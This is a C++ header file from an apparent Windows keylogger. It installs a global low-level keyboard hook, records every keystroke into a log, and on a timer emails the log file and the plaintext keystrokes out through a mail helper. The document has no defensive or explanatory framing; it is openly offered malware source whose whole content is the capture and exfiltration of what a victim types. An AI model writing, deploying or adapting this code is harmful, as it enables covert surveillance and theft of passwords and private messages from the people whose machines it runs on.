#ifndef _KEYBOARDHOOK_H_
#define _KEYBOARDHOOK_H_

#include <iostream>
#include <fstream>
#include <windows.h>
#include "keyConstants.h"
#include "timer.h"
#include "sendEmail.h"

std::string keylog = "";

HHOOK eHook = NULL;

void timerSendMail()
{
	if (keylog.empty()) { return; }
		
	std::string last_file = inputOutput::writeLog(keylog);

	if (last_file.empty())
	{
		Helper::writeLogFile("File was not created! Keylog '" + keylog + "'");
		return;
	}

	int x = Mail::sendMail("Log File [" + last_file + "]",
		"The log file has been attached to this mail.\n"
		"Keys have also been decrypted below:\n" + keylog,
		inputOutput::getOurPath(true) + last_file);

	if (x != 7)
	{
		Helper::writeLogFile("Mail was not send! Error code: " + Helper::toString(x));
	}
	else
	{
		keylog = "";
	}
}

Timer MailTimer(timerSendMail, 500 * 60, Timer::Infinite);

LRESULT ourKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
	{
		CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += Keys::KEYS[kbs->vkCode].Name;

		if (kbs->vkCode == VK_RETURN)
		{
			keylog += '\n';
		}
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;

		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
			|| key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT
			|| key == VK_MENU || key == VK_LMENU || key == VK_RMENU
			|| key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN
			|| key == VK_RWIN)
		{
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}
	}

	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool installHook()
{
	Helper::writeLogFile("Hook Started... Timer started");
	MailTimer.start(true);

	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)ourKeyBoardProc,
		GetModuleHandle(NULL), 0);

	return eHook == NULL;
}

bool uninstallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;

	return (bool)b;
}

bool isHooked()
{
	return (bool)(eHook == NULL);
}
#endif // _KEYBOARDHOOK_H_